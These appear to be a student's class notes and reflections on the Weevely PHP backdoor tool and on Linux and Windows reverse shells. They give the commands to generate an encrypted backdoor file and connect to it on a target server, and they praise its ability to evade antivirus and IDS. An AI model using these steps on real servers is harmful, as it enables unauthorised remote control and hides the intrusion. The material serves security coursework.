# Week 8 (Class on 3/18/24)

## 3.1 Weevely PHP Shell Notes
Weevely is a very cool application to generate an ecrypted PHP reverse shell so that an attacker can control a vulnerable PHP web server.

It's also fairly straight-forward to use

To generate a PHP backdoor file, simply do
`weevely generate <some_strong_password_for_encryption> <filename_for_backdoor_file>`

Then, depending on your host, you need to get this file onto the server. 

Once it is, you can then do
`weevely http://target/path/to/file.php <your_password_from_earlier>`

And then you should be in a shell on the target server!

## 3.1 Weevely Reflection
This tool is super cool! Way more easy to use than manaually writing out (or even copy/pasting) someone else's reverse shell doc, and then manually dealing with a listener.

As an added bonus, since the contents of the commands you run and their results are encrypted, even if the web connection itself isn't, it's less likely to trigger antivirus or IDS type programs.

## 3.2 Reverse Shells Reflection & Notes

It was super interesting to see the plaintext commands and responses in wireshark. Makes it totally understandable why tools like weevely are so important.

The Windows reverse shell was also quite interesting, and if I had sat down with PowerShell more before, I could definitely see how dangerous it could be, even for an OS more known for graphical configurations. The demonstration of getting caught by Windows Defender also once again illustrated the value of tools like weevely to do even just the bare minimum to hide your suspicious/malicious activities.

Although, that being said, it was also comically easy to get Defender out of the way, so it clearly doesn't do much to defend ITSELF against things like social engineering type attacks.

I'd played with Linux reverse shells some before, so the final challenge was fairly familiar to me, and I used the lovely [RevShell](https://www.revshells.com/) generator to spit out a simple python one. 